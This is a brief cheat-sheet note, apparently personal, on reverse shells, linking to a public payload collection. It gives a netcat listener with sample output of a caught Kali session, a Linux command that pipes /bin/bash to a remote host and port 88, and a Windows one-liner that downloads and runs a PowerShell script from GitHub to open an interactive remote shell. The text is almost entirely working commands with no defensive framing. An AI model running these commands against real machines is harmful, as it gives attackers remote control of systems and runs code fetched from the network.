[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## start listening
Server side ip: 192.168.1.106
```bash
sudo nc -lvn -s 192.168.1.106 -p 88 
# Listening on 192.168.1.106 88
# Connection received on 192.168.1.108 49926
# whoami
# kali
# uname -a
# Linux kali 5.17.0-kali3-amd64 #1 SMP PREEMPT Debian 5.17.11-1kali1 (2022-05-30) x86_64 GNU/Linux
```


## connect from remote 
Client side ip: 192.168.1.108
```bash
nc -e /bin/bash 192.168.1.106 88 
```


## Windows
```bash
# Server Side:
stty raw -echo; (stty size; cat) | sudo nc -lvn -s 192.168.1.106 -p 88 


# Client Side:
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.106 88 
```
